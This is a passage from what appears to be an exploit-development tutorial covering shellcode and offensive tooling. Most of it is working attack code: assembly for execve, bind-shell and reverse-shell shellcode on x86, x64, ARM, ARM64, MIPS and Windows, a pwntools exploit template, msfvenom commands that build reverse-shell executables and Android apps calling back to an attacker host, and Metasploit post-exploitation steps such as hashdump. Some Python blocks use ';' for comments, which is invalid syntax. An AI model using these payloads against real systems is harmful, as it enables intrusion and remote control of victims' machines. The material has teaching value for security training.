                # For shell spawning, it will timeout (expected)
                # For other payloads, check return code
                
                log.success("Shellcode executed successfully")
                return True
                
            except subprocess.TimeoutExpired:
                # Timeout is OK for shell spawning shellcode
                log.info("Shellcode execution timeout (likely spawned shell)")
                return True
            
        except Exception as e:
            log.error(f"Test failed: {e}")
            return False
        
        finally:
            # Cleanup
            for f in [c_file, binary]:
                if os.path.exists(f):
                    os.remove(f)
    
    def compare_shellcodes(self, original, encoded_with_decoder):
        """
        Compare behavior of original vs encoded shellcode
        """
        log.info("Testing original shellcode...")
        original_result = self.test_shellcode(original)
        
        log.info("Testing encoded shellcode...")
        encoded_result = self.test_shellcode(encoded_with_decoder)
        
        if original_result and encoded_result:
            log.success("Both shellcodes work correctly!")
            return True
        else:
            log.error("Shellcode behavior differs!")
            return False

# Usage example
if __name__ == "__main__":
    tester = ShellcodeTester()
    
    # Original shellcode
    original = asm(shellcraft.i386.linux.sh())
    
    # Encode it
    encoder = XOREncoder()
    encoded_payload, key = encoder.create_payload(original)
    
    # Test both
    print("\n" + "="*60)
    print("SHELLCODE TESTING")
    print("="*60)
    
    tester.compare_shellcodes(original, encoded_payload)
```

## Architecture-Specific Shellcode

### x86 (32-bit) Linux Shellcode

#### Basic execve("/bin/sh")

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'linux'

def x86_execve_shell():
    """
    Minimal execve("/bin/sh", ["/bin/sh", NULL], NULL)
    ~25 bytes
    """
    shellcode = """
        xor eax, eax        ; Zero EAX
        push eax            ; NULL terminator
        push 0x68732f2f     ; "//sh"
        push 0x6e69622f     ; "/bin"
        mov ebx, esp        ; EBX = "/bin//sh"
        push eax            ; NULL
        push ebx            ; "/bin//sh"
        mov ecx, esp        ; ECX = ["/bin//sh", NULL]
        mov edx, eax        ; EDX = NULL (envp)
        mov al, 11          ; sys_execve
        int 0x80
    """
    return asm(shellcode)

# Generate and display
shell = x86_execve_shell()
print("x86 execve shellcode:")
print(f"Size: {len(shell)} bytes")
print(f"Hex: {shell.hex()}")
print(f"\nDisassembly:\n{disasm(shell)}")
```

#### Bind Shell (x86)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def x86_bind_shell(port=4444):
    """
    Complete bind shell for x86 Linux
    Opens socket on specified port, waits for connection, spawns shell
    """
    port_bytes = struct.pack('!H', port)
    
    shellcode = f"""
        ; socket(AF_INET, SOCK_STREAM, 0)
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        push ecx            ; protocol = 0
        push 1              ; SOCK_STREAM
        push 2              ; AF_INET
        mov al, 102         ; sys_socketcall
        mov bl, 1           ; SYS_SOCKET
        mov ecx, esp
        int 0x80
        mov esi, eax        ; Save socket fd in ESI
        
        ; bind(sockfd, &addr, 16)
        xor ebx, ebx
        push ebx            ; sin_addr = INADDR_ANY (0.0.0.0)
        push word {u16(port_bytes)}  ; sin_port
        push word 2         ; sin_family = AF_INET
        mov ecx, esp        ; ECX = &sockaddr
        
        push byte 16        ; addrlen
        push ecx            ; &sockaddr
        push esi            ; sockfd
        mov ecx, esp
        
        xor eax, eax
        mov al, 102         ; sys_socketcall
        mov bl, 2           ; SYS_BIND
        int 0x80
        
        ; listen(sockfd, 1)
        push byte 1         ; backlog
        push esi            ; sockfd
        mov ecx, esp
        
        xor eax, eax
        mov al, 102
        mov bl, 4           ; SYS_LISTEN
        int 0x80
        
        ; accept(sockfd, NULL, NULL)
        xor ecx, ecx
        push ecx            ; NULL
        push ecx            ; NULL
        push esi            ; sockfd
        mov ecx, esp
        
        xor eax, eax
        mov al, 102
        mov bl, 5           ; SYS_ACCEPT
        int 0x80
        mov edi, eax        ; Save client fd in EDI
        
        ; dup2(client_fd, 0/1/2)
        xor ecx, ecx
        mov cl, 3
    dup_loop:
        dec ecx
        mov al, 63          ; sys_dup2
        mov ebx, edi        ; client_fd
        int 0x80
        inc ecx
        loop dup_loop
        
        ; execve("/bin/sh", ["/bin/sh"], NULL)
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        mov edx, eax
        mov al, 11
        int 0x80
    """
    
    return asm(shellcode)

# Generate
bind = x86_bind_shell(port=4444)
print(f"x86 Bind shell: {len(bind)} bytes")
print(f"Port: 4444")
```

#### Reverse Shell (x86)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def x86_reverse_shell(ip, port):
    """
    Reverse shell for x86 Linux
    Connects back to attacker IP:port
    """
    ip_hex = u32(socket.inet_aton(ip))
    port_hex = u16(struct.pack('!H', port))
    
    shellcode = f"""
        ; socket(AF_INET, SOCK_STREAM, 0)
        xor eax, eax
        xor ebx, ebx
        push eax            ; protocol = 0
        push 1              ; SOCK_STREAM
        push 2              ; AF_INET
        mov al, 102
        mov bl, 1           ; SYS_SOCKET
        mov ecx, esp
        int 0x80
        mov esi, eax        ; Save socket fd
        
        ; connect(sockfd, &addr, 16)
        push {hex(ip_hex)}      ; sin_addr
        push word {hex(port_hex)} ; sin_port
        push word 2         ; sin_family
        mov ecx, esp
        
        push byte 16
        push ecx
        push esi
        mov ecx, esp
        
        mov al, 102
        mov bl, 3           ; SYS_CONNECT
        int 0x80
        
        ; dup2 for stdin/stdout/stderr
        xor ecx, ecx
    dup_loop:
        mov al, 63
        mov ebx, esi
        int 0x80
        inc ecx
        cmp cl, 3
        jl dup_loop
        
        ; execve("/bin/sh")
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        cdq
        mov al, 11
        int 0x80
    """
    
    return asm(shellcode)

# Generate
reverse = x86_reverse_shell("192.168.1.100", 4444)
print(f"x86 Reverse shell: {len(reverse)} bytes")
```

### x86-64 (64-bit) Linux Shellcode

#### Basic execve (x64)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

def x64_execve_shell():
    """
    Minimal execve("/bin/sh") for x64
    ~27 bytes
    """
    shellcode = """
        xor rsi, rsi        ; argv = NULL
        push rsi            ; NULL terminator
        mov rdi, 0x68732f6e69622f  ; "/bin/sh"
        push rdi
        push rsp
        pop rdi             ; RDI = "/bin/sh"
        xor rdx, rdx        ; envp = NULL
        push 59
        pop rax             ; sys_execve
        syscall
    """
    return asm(shellcode)

# Or use pwntools
shell_x64 = asm(shellcraft.amd64.linux.sh())
print(f"x64 execve shellcode: {len(shell_x64)} bytes")
print(disasm(shell_x64))
```

#### Reverse Shell (x64)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def x64_reverse_shell(ip, port):
    """
    x64 reverse shell
    Uses 64-bit syscalls
    """
    ip_hex = u32(socket.inet_aton(ip))
    port_hex = u16(struct.pack('!H', port))
    
    shellcode = f"""
        ; socket(AF_INET, SOCK_STREAM, 0)
        push 41
        pop rax             ; sys_socket
        push 2
        pop rdi             ; AF_INET
        push 1
        pop rsi             ; SOCK_STREAM
        cdq                 ; RDX = 0
        syscall
        mov rdi, rax        ; Save socket fd
        
        ; connect(sockfd, &addr, 16)
        xchg rdi, rax
        movabs rcx, 0x{ip_hex:08x}0002{port_hex:04x}
        push rcx
        mov rsi, rsp
        push 16
        pop rdx
        push 42
        pop rax             ; sys_connect
        syscall
        
        ; dup2 loop
        xor esi, esi
        push 3
        pop rsi
    dup_loop:
        dec esi
        push 33
        pop rax             ; sys_dup2
        syscall
        test esi, esi
        jnz dup_loop
        
        ; execve("/bin/sh")
        push 59
        pop rax
        cdq
        push rdx
        movabs rdi, 0x68732f6e69622f
        push rdi
        push rsp
        pop rdi
        push rdx
        push rdi
        push rsp
        pop rsi
        syscall
    """
    
    return asm(shellcode)

# Generate
reverse_x64 = x64_reverse_shell("192.168.1.100", 4444)
print(f"x64 Reverse shell: {len(reverse_x64)} bytes")
```

### ARM Linux Shellcode

#### ARM 32-bit execve

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'
context.os = 'linux'

def arm_execve_shell():
    """
    ARM 32-bit execve("/bin/sh")
    """
    shellcode = """
        .code 32
        
        ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
        add r0, pc, #16         ; R0 = "/bin/sh"
        mov r1, #0
        mov r2, #0
        mov r7, #11             ; sys_execve
        svc #0                  ; Make syscall
        
    binsh:
        .ascii "/bin/sh\\0"
    """
    
    return asm(shellcode)

# Or use pwntools
shell_arm = asm(shellcraft.arm.linux.sh())
print(f"ARM execve shellcode: {len(shell_arm)} bytes")
print(disasm(shell_arm))
```

#### ARM Reverse Shell

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'

def arm_reverse_shell(ip, port):
    """
    ARM 32-bit reverse shell
    """
    ip_bytes = socket.inet_aton(ip)
    ip_int = u32(ip_bytes)
    port_bytes = struct.pack('!H', port)
    port_int = u16(port_bytes)
    
    # ARM shellcode uses different calling convention
    # Arguments in r0-r6, syscall number in r7, svc #0
    
    shellcode = f"""
        .code 32
        
        ; socket(AF_INET, SOCK_STREAM, 0)
        mov r0, #2              ; AF_INET
        mov r1, #1              ; SOCK_STREAM
        mov r2, #0              ; protocol
        mov r7, #281            ; sys_socket
        svc #0
        mov r4, r0              ; Save socket fd in R4
        
        ; connect(sockfd, &addr, 16)
        mov r0, r4              ; sockfd
        add r1, pc, #28         ; &sockaddr
        mov r2, #16             ; addrlen
        mov r7, #283            ; sys_connect
        svc #0
        
        ; dup2 loop
        mov r5, #2
    dup_loop:
        mov r0, r4
        mov r1, r5
        mov r7, #63
        svc #0
        subs r5, r5, #1
        bpl dup_loop
        
        ; execve
        add r0, pc, #12
        mov r1, #0
        mov r2, #0
        mov r7, #11
        svc #0
        
    sockaddr:
        .short 2                ; AF_INET
        .short {port_int}       ; Port (network byte order)
        .word {ip_int}          ; IP address
        
    binsh:
        .ascii "/bin/sh\\0"
    """
    
    return asm(shellcode)

# Generate
arm_reverse = arm_reverse_shell("192.168.1.100", 4444)
print(f"ARM Reverse shell: {len(arm_reverse)} bytes")
```

### ARM64 (AArch64) Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'

def arm64_execve_shell():
    """
    ARM64 execve("/bin/sh")
    """
    shellcode = """
        ; execve("/bin/sh", NULL, NULL)
        mov x0, #0
        adr x0, binsh           ; X0 = "/bin/sh"
        mov x1, #0              ; argv = NULL
        mov x2, #0              ; envp = NULL
        mov x8, #221            ; sys_execve
        svc #0
        
    binsh:
        .ascii "/bin/sh\\0"
    """
    
    return asm(shellcode)

# Generate
shell_arm64 = arm64_execve_shell()
print(f"ARM64 execve shellcode: {len(shell_arm64)} bytes")
print(disasm(shell_arm64))
```

### MIPS Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'mips'
context.os = 'linux'
context.endian = 'little'  # or 'big' for MIPS BE

def mips_execve_shell():
    """
    MIPS execve("/bin/sh")
    MIPS uses $v0 for syscall number
    Arguments in $a0-$a3
    """
    shellcode = """
        .set noreorder
        
        ; execve("/bin/sh", NULL, NULL)
        li $v0, 4011            ; sys_execve (MIPS syscall number)
        lui $a0, 0x2f62         ; "/b"
        ori $a0, $a0, 0x696e    ; "in"
        sw $a0, -8($sp)
        lui $a0, 0x2f73         ; "/s"
        ori $a0, $a0, 0x6800    ; "h\\0"
        sw $a0, -4($sp)
        addiu $a0, $sp, -8      ; $a0 = "/bin/sh"
        slti $a1, $zero, -1     ; $a1 = NULL
        slti $a2, $zero, -1     ; $a2 = NULL
        syscall 0x40404
    """
    
    return asm(shellcode)

# Generate
shell_mips = mips_execve_shell()
print(f"MIPS execve shellcode: {len(shell_mips)} bytes")
```

### Windows x86 Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'windows'

def win_x86_exec_cmd():
    """
    Windows x86 shellcode
    Execute cmd.exe using WinExec
    """
    shellcode = """
        ; Find kernel32.dll base
        xor ecx, ecx
        mul ecx
        mov eax, [fs:ecx+0x30]  ; PEB
        mov eax, [eax+0x0c]     ; PEB->Ldr
        mov esi, [eax+0x14]     ; InMemoryOrderModuleList
        lodsd
        xchg eax, esi
        lodsd
        mov ebx, [eax+0x10]     ; kernel32.dll base
        
        ; Find WinExec export
        mov edx, [ebx+0x3c]     ; PE header offset
        add edx, ebx
        mov edx, [edx+0x78]     ; Export table RVA
        add edx, ebx
        mov esi, [edx+0x20]     ; AddressOfNames RVA
        add esi, ebx
        xor ecx, ecx
        
    find_winexec:
        inc ecx
        lodsd
        add eax, ebx
        cmp dword ptr [eax], 0x456e6957  ; "WinE"
        jnz find_winexec
        cmp dword ptr [eax+0x04], 0x63657845  ; "xec"
        jnz find_winexec
        
        ; Get function address
        mov esi, [edx+0x24]     ; AddressOfNameOrdinals
        add esi, ebx
        mov cx, [esi+ecx*2]
        dec ecx
        mov esi, [edx+0x1c]     ; AddressOfFunctions
        add esi, ebx
        mov edx, [esi+ecx*4]
        add edx, ebx            ; EDX = WinExec address
        
        ; Call WinExec("cmd", SW_SHOW)
        xor ecx, ecx
        push ecx
        push 0x6578652e
        push 0x646d6320
        mov eax, esp            ; "cmd.exe"
        
        inc ecx
        push ecx                ; SW_SHOWNORMAL = 1
        push eax                ; "cmd.exe"
        call edx                ; WinExec
    """
    
    return asm(shellcode)

# Note: Windows shellcode is more complex due to:
# - ASLR (need to find kernel32.dll dynamically)
# - No direct syscalls (use Win32 API)
# - DEP bypass techniques needed

print("Windows shellcode is significantly more complex than Linux")
print("Typically uses techniques like:")
print("  - PEB traversal to find kernel32.dll")
print("  - Export table parsing for API addresses")
print("  - VirtualProtect/VirtualAlloc for DEP bypass")
```

### Architecture Comparison

```python
#!/usr/bin/env python3
from pwn import *

def compare_architectures():
    """Compare shellcode across different architectures"""
    
    architectures = [
        ('i386', 'linux'),
        ('amd64', 'linux'),
        ('arm', 'linux'),
        ('aarch64', 'linux'),
        ('mips', 'linux'),
    ]
    
    results = []
    
    for arch, os_name in architectures:
        try:
            context.arch = arch
            context.os = os_name
            
            # Generate simple shell
            if arch in ['i386', 'amd64', 'arm', 'aarch64']:
                shellcode = asm(shellcraft.sh())
            else:
                shellcode = b"\x90" * 50  # Placeholder
            
            results.append({
                'arch': arch,
                'size': len(shellcode),
                'syscall': {
                    'i386': 'int 0x80',
                    'amd64': 'syscall',
                    'arm': 'svc #0',
                    'aarch64': 'svc #0',
                    'mips': 'syscall',
                }[arch],
                'calling_convention': {
                    'i386': 'EBX, ECX, EDX, ESI, EDI, EBP',
                    'amd64': 'RDI, RSI, RDX, R10, R8, R9',
                    'arm': 'R0-R6',
                    'aarch64': 'X0-X7',
                    'mips': '$a0-$a3',
                }[arch]
            })
        except:
            pass
    
    # Print comparison table
    print("\nArchitecture Comparison")
    print("=" * 80)
    print(f"{'Architecture':<12} {'Size':<8} {'Syscall':<15} {'Arguments'}")
    print("-" * 80)
    
    for r in results:
        print(f"{r['arch']:<12} {r['size']:<8} {r['syscall']:<15} {r['calling_convention']}")

compare_architectures()
```

### Shellcode Testing Framework

```python
#!/usr/bin/env python3
from pwn import *
import tempfile
import subprocess

class CrossArchShellcodeTester:
    """Test shellcode across different architectures using QEMU"""
    
    def __init__(self):
        self.qemu_binaries = {
            'i386': 'qemu-i386',
            'amd64': 'qemu-x86_64',
            'arm': 'qemu-arm',
            'aarch64': 'qemu-aarch64',
            'mips': 'qemu-mips',
        }
    
    def test_shellcode(self, shellcode, arch):
        """
        Test shellcode using QEMU user-mode emulation
        """
        if arch not in self.qemu_binaries:
            log.error(f"Unsupported architecture: {arch}")
            return False
        
        # Create ELF with shellcode
        context.arch = arch
        context.os = 'linux'
        
        elf_data = make_elf(shellcode)
        
        # Write to temp file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(elf_data)
            temp_file = f.name
        
        os.chmod(temp_file, 0o755)
        
        try:
            # Run with QEMU
            qemu_cmd = [self.qemu_binaries[arch], temp_file]
            result = subprocess.run(
                qemu_cmd,
                capture_output=True,
                timeout=5
            )
            
            log.success(f"{arch} shellcode executed")
            return True
            
        except subprocess.TimeoutExpired:
            log.info(f"{arch} shellcode timeout (likely shell spawn)")
            return True
        except Exception as e:
            log.error(f"{arch} test failed: {e}")
            return False
        finally:
            os.remove(temp_file)

# Example usage
tester = CrossArchShellcodeTester()

# Test x86 shellcode
context.arch = 'i386'
shellcode_x86 = asm(shellcraft.sh())
tester.test_shellcode(shellcode_x86, 'i386')
```

This completes the Shellcoding section covering polymorphic shellcode, staged payloads, shellcode encoders, and architecture-specific shellcode with practical examples and tools for each category.

---

# Exploitation Frameworks & Tools

## Pwntools Python Library

Pwntools is a comprehensive Python exploitation framework providing utilities for binary interaction, ROP chain generation, shellcode crafting, and cryptographic operations. Mastery of pwntools dramatically accelerates exploit development.

**Pwntools installation**

```bash
pip install pwntools
# or
sudo apt-get install python3-pwntools
```

Verify installation:

```bash
python3 -c "from pwn import *; print(pwn.__version__)"
```

**Core pwntools modules**

```python
from pwn import *

# Primary imports
process()           ; Launch local binary
remote()            ; Connect to remote service
ELF()               ; Parse binary
ROP()               ; Generate ROP chains
asm()               ; Assemble assembly
disasm()            ; Disassemble binary
shellcraft          ; Shellcode templates
```

**Process interaction (process())**

Launch local binary:

```python
from pwn import *

p = process('./binary')
p.send(b'input')
data = p.recv(1024)
p.sendline(b'line_input')
p.interactive()  ; Interactive shell
p.close()
```

**Remote connection (remote())**

Connect to network service:

```python
p = remote('example.com', 4444)
p.send(b'data')
response = p.recv(1024)
p.interactive()
```

**Binary parsing (ELF())**

Load and analyze binary:

```python
elf = ELF('./binary')

print(elf.address)           # Base address
print(elf.entry)             # Entry point
print(elf.symbols['main'])   # Symbol address
print(elf.got['printf'])     # GOT entry
print(elf.plt['system'])     # PLT entry

# Search for strings
bin_sh = elf.search(b'/bin/sh').__next__()

# Read section
text_section = elf.get_section_by_name('.text')
```

**Assembly and disassembly**

Assemble assembly to bytes:

```python
context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
    xor rax, rax
    mov rdi, 1
    syscall
""")

# Disassemble bytes
disasm_output = disasm(b'\x48\x31\xc0\x48\x89\xc7\x0f\x05')
```

**Shellcode generation (shellcraft)**

Generate standard shellcode templates:

```python
# /bin/sh shell
shellcode = asm(shellcraft.sh())

# Read file
shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3, 'rsp', 100))
shellcode += asm(shellcraft.write(1, 'rsp', 100))

# Reverse shell
shellcode = asm(shellcraft.connect('attacker_ip', 4444))
shellcode += asm(shellcraft.dupsh())

# Bind shell
shellcode = asm(shellcraft.listen(4444))
shellcode += asm(shellcraft.acceptor())
shellcode += asm(shellcraft.dupsh())
```

**ROP chain generation**

Automated gadget finding and chaining:

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Automatic chain building
rop.call('system', [elf.search(b'/bin/sh').__next__()])
rop.exit(0)

print(rop.dump())   # Display chain
chain_bytes = rop.chain()

# Manual gadget access
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

**Format string exploitation**

Automated format string attacks:

```python
from pwn import *

def send_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recv(1024)

fmt = FmtStr(send_fmt)

# Leak memory
leaked = fmt.leak(offset=5)

# Write to memory
fmt.write(target_addr, value)
fmt.execute_writes()
```

**Packing/unpacking utilities**

Convert between data formats:

```python
# Pack integers
p64(0x12345678)     # 8-byte little-endian
p32(0x1234)         # 4-byte little-endian
p16(0x1234)         # 2-byte little-endian

# Unpack
u64(b'\x78\x56\x34\x12\x00\x00\x00\x00')  # = 0x12345678

# Pack with endianness
p64(0x1234, endian='big')

# Hex conversion
hex(0x1234)         # '0x1234'
int('0x1234', 16)   # 4660
```

**Pattern generation**

Create cyclic patterns for offset finding:

```python
# Generate pattern
pattern = cyclic(100)

# Crash binary
p = process('./binary')
p.send(pattern)

# Find offset
crash_value = 0x62616164  # From crash
offset = cyclic_find(crash_value)
print(f"Offset: {offset}")
```

**Encoding and encryption**

Utilities for common encoding schemes:

```python
# XOR encoding
encoded = xor(shellcode, 0xff)

# Base64
from pwn import *
encoded = base64.b64encode(shellcode)

# Hex
hex_encoded = hexify(shellcode)

# Substitution ciphers
encoded = decode(shellcode, 'xor')
```

**Context setup**

Configure architecture and OS:

```python
context.arch = 'amd64'      # x86-64
context.os = 'linux'        # Linux
context.endian = 'little'   # Little-endian
context.log_level = 'debug' # Verbose output

# ARM variants
context.arch = 'arm'
context.thumb = True  # Thumb mode

# MIPS
context.arch = 'mips'
context.endian = 'big'
```

**Logging and debugging**

Control output verbosity:

```python
context.log_level = 'info'    # Basic info
context.log_level = 'debug'   # Detailed debugging
context.log_level = 'error'   # Errors only

log.info("Message")
log.error("Error")
log.success("Success!")

# Hexdump
hexdump(data)
```

**Libc database integration**

Find libc symbols by leaked address:

```python
from pwn import *

# Leak puts() address
leaked_puts = 0x7ffff7e50c10

# Query libc-database
libc = ELF('/lib64/libc.so.6')
libc_base = leaked_puts - libc.symbols['puts']

system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + list(libc.search(b'/bin/sh'))[0]
```

**Pwntools exploitation template**

Complete exploit structure:

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target
TARGET = './binary'
REMOTE = False

def connect():
    if REMOTE:
        return remote('example.com', 4444)
    else:
        return process(TARGET)

def exploit():
    p = connect()
    
    # Step 1: Leak addresses
    p.send(b'format_string_payload')
    leak = p.recv(1024)
    libc_base = parse_leak(leak)
    
    # Step 2: Build ROP chain
    elf = ELF(TARGET)
    rop = ROP(elf)
    rop.call('system', [elf.search(b'/bin/sh').__next__()])
    
    # Step 3: Send exploit
    offset = 40
    payload = b'A' * offset
    payload += rop.chain()
    
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

**Pwntools advantages**

- **Rapid development:** Pre-built utilities eliminate boilerplate
- **Cross-platform:** Works on Linux, macOS, Windows
- **Integrated tools:** Assembly, shellcode, ROP in one library
- **Libc integration:** Automatic address calculation
- **Pattern generation:** Cyclic patterns for offset finding

**Pwntools limitations**

- **Performance:** Slower than compiled languages for heavy computation
- **Binary compatibility:** Some edge cases with unusual binaries
- **Learning curve:** Many utilities to master

---

## Metasploit Framework

Metasploit Framework is a comprehensive exploitation platform with thousands of pre-built payloads, encoders, and auxiliary modules. Essential for rapid exploitation development and social engineering.

**Metasploit installation**

```bash
sudo apt-get install metasploit-framework
# or build from source
git clone https://github.com/rapid7/metasploit-framework.git
```

Start msfconsole:

```bash
msfconsole
```

**Metasploit structure**

```
modules/
  exploits/       ; Vulnerability exploits
  payloads/       ; Shellcode and stagers
  encoders/       ; Encoding schemes
  auxiliary/      ; Information gathering, scanners
  post/           ; Post-exploitation modules
```

**Msfvenom payload generation**

Generate standalone payloads without Metasploit:

```bash
# Basic Linux /bin/sh payload
msfvenom -p linux/x64/exec CMD=/bin/sh -f python

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe

# Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -o app.apk

# Shellcode formats
msfvenom -p linux/x64/exec CMD=/bin/sh -f asm    # Assembly
msfvenom -p linux/x64/exec CMD=/bin/sh -f c      # C array
msfvenom -p linux/x64/exec CMD=/bin/sh -f python # Python bytes
msfvenom -p linux/x64/exec CMD=/bin/sh -f ruby   # Ruby
```

**Encoding with msfvenom**

Bypass filters:

```bash
# XOR encoding
msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/xor -f python

# Alphanumeric encoding
msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/alphanumeric -f python

# Multi-encoder (chain encoders)
msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/xor -e x86/shikata_ga_nai -f python

# Specify encoder iterations
msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/xor -i 5 -f python
```

**Msfconsole interactive exploitation**

Launch interactive Metasploit console:

```bash
msfconsole
```

Search for exploits:

```
msf > search apache
msf > search CVE-2017-5645
```

Load exploit:

```
msf > use exploit/linux/http/apache_struts_rce
```

Set options:

```
msf > set RHOST 192.168.1.100
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > show options
```

Execute exploit:

```
msf > exploit
```

**Listener setup (handler)**

Catch reverse shells:

```bash
msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf > set LHOST 0.0.0.0
msf > set LPORT 4444
msf > exploit
```

Alternatively:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -o shell
nc -lvnp 4444  ; Simple netcat listener
```

**Payload types**

**Staged payload:**

- Downloads second stage after initial connection
- Smaller initial size, more functionality

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp  ; Staged
msfvenom -p linux/x64/shell/reverse_tcp        ; Non-staged
```

**Meterpreter interactive session**

After successful exploitation:

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > kill [PID]
meterpreter > shell
meterpreter > download /etc/passwd
meterpreter > upload shell.elf /tmp/
```

**Post-exploitation modules**

Gather information post-compromise:

```
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/multi/manage/shell_to_meterpreter
```

**Custom modules**

Create custom Metasploit modules:

```ruby
# exploit/custom/my_exploit.rb
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Exploit',
      'Description' => 'Custom vulnerability exploit',
      'Author'      => ['Attacker'],
      'Payload'     => { 'BadChars' => "\x00" }
    ))
    
    register_options([
      Opt::RHOST(),
      Opt::RPORT(80)
    ])
  end

  def exploit
    connect
    send_request_raw({'uri' => '/vulnerable', 'method' => 'GET'})
    handler
  end
end
```

**Metasploit auxiliary modules**

Scanning and reconnaissance:

```bash
msf > use auxiliary/scanner/http/http_version
msf > use auxiliary/scanner/ssh/ssh_version
msf > use auxiliary/scanner/smb/smb_enumshares
```

**Advantages of Metasploit**

- **Comprehensive:** Thousands of pre-built exploits
- **Easy payload generation:** Msfvenom handles encoding
- **Post-exploitation:** Built-in modules for persistence, privilege escalation
- **Community:** Large repository of modules
- **Integration:** Works with other penetration testing tools

**Limitations**

- **Detection:** Well-known signatures detected by AV
- **Complexity:** Large framework, steep learning curve
- **Customization:** Modifying existing modules requires Ruby knowledge

---

## ROPgadget and Ropper

ROPgadget and Ropper are specialized tools for finding ROP gadgets in binaries, enabling efficient gadget discovery for chain construction.

**ROPgadget installation**

```bash
git clone https://github.com/JonathanSalwan/ROPgadget.git
cd ROPgadget
sudo pip3 install -r requirements.txt
sudo python3 setup.py install
```

**ROPgadget basic usage**

Search gadgets in binary:

```bash
ROPgadget --binary /path/to/binary --all
```

Output: List of all gadgets with addresses.

**Filter gadgets by type**

Find specific gadgets:

```bash
# Syscall gadgets
ROPgadget --binary /path/to/binary --only "syscall"

# Mov instructions
ROPgadget --binary /path/to/binary --only "mov"

# Pop instructions
ROPgadget --binary /path/to/binary --only "pop"

# Arithmetic
ROPgadget --binary /path/to/binary --only "add|sub"
```

**Grep pattern matching**

```bash
# Find pop rdi; ret
ROPgadget --binary /path/to/binary | grep "pop rdi"

# Find mov rax, rdx; ret
ROPgadget --binary /path/to/binary | grep "mov rax, rdx"

# Exclude unwanted patterns
ROPgadget --binary /path/to/binary | grep -v "add rsp"
```

**Semantic gadgets**

Find gadgets achieving specific operations:

```bash
# Set RAX to zero
ROPgadget --binary /path/to/binary --semantic "rax = 0"

# Add registers
ROPgadget --binary /path/to/binary --semantic "rax += rbx"
```

[Unverified] Semantic gadget support varies, may not be available in all versions.

**ROP chain generation**

Automated chain building:

```bash
# Generate complete ROP chain for exec
ROPgadget --binary /path/to/binary --chain exec
```

**ROPgadget output formats**

Display gadgets in different formats:

```bash
# Default (addresses and instructions)
ROPgadget --binary /path/to/binary

# Only addresses
ROPgadget --binary /path/to/binary --only "mov" | cut -d: -f1

# Detailed information
ROPgadget --binary /path/to/binary --depth 3
```

**Ropper installation**

```bash
pip3 install ropper
```

**Ropper basic usage**

```bash
ropper --file /path/to/binary
```

Interactive prompt:

```
ropper> search "mov rdi"
ropper> search "pop rdi; ret"
ropper> search "syscall"
```

**Ropper gadget search**

```bash
# Search specific gadgets
ropper --file /path/to/binary --search "pop rdi"

# Search with regex
ropper --file /path/to/binary --search "mov .* 0"

# Search by instruction length
ropper --file /path/to/binary --search "pop" --length 1
```

**Ropper semantic search**

```bash
# Find gadgets with semantic meaning
ropper --file /path/to/binary --semantic "rax = 0"
ropper --file /path/to/binary --semantic "write-what-where"
```

**Ropper chain generation**

```bash
# Generate ROP chain for specific goal
ropper --file /path/to/binary --chain "exec"

# Show individual gadgets
ropper --file /path/to/binary --search "pop rdi" --all
```

**Ropper filtering**

Filter gadgets by criteria:

```bash
ropper --file /path/to/binary --filter "rdi"  # Contains rdi
ropper --file /path/to/binary --filter "pop"  # Pop instructions

# Negative filtering
ropper --file /path/to/binary --exclude "jmp"  # Exclude jmp
```

**Ropper interactive mode**

```bash
ropper --file /path/to/binary -i
ropper> search pop
ropper> show 0x401234
ropper> chain
ropper> set arch arm
```

**Comparison: ROPgadget vs Ropper**

|Feature|ROPgadget|Ropper|
|---|---|---|
|Speed|Very fast|Slightly slower|
|Semantic search|Limited|Good|
|Interactive mode|No|Yes|
|Chain generation|Basic|Advanced|
|Install|Python script|pip|

**Gadget verification (GDB)**

Verify discovered gadgets:

```bash
gdb ./binary
(gdb) x/10i 0x401234
# Verify gadget at address
```

**Practical workflow**

1. Search for required gadgets:

```bash
